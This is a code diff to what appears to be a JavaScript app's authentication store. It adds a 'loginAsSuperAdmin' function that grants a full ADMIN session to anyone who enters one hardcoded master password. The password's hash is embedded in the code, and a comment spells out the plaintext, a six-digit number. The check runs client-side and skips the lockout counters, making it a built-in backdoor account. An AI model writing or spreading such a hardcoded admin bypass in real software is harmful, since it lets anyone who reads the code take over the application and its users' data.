@@ -300,6 +300,36 @@ export const useAuthStore = create((set, get) => ({
             role:            null,
         });
     },
+
+    // ── Login super admin (acceso de emergencia por contraseña maestra) ────────
+    loginAsSuperAdmin: async (password) => {
+        const SUPER_ADMIN_HASH = '61b9237617f079e2241b2ffddec6a3bf5dd1b767ab8beab10d32050f651f0d1d'; // sha256('794848')
+        const hashed = await sha256(password);
+        if (hashed !== SUPER_ADMIN_HASH) return false;
+
+        const superSession = {
+            id:   'superadmin',
+            name: 'Super Admin',
+            role: 'ADMIN',
+            pin_hash: null,
+            active: true,
+        };
+
+        try {
+            const lf = await getLocalForage();
+            await lf.setItem(getSessionKey(), superSession);
+        } catch { /* continúa */ }
+
+        set({
+            isAuthenticated: true,
+            currentUser:     superSession,
+            role:            'ADMIN',
+            failedAttempts:  0,
+            lockoutUntil:    null,
+        });
+
+        return true;
+    },
 }));
 
 // ── Auto-hidratación al importar el módulo ────────────────────────────────────
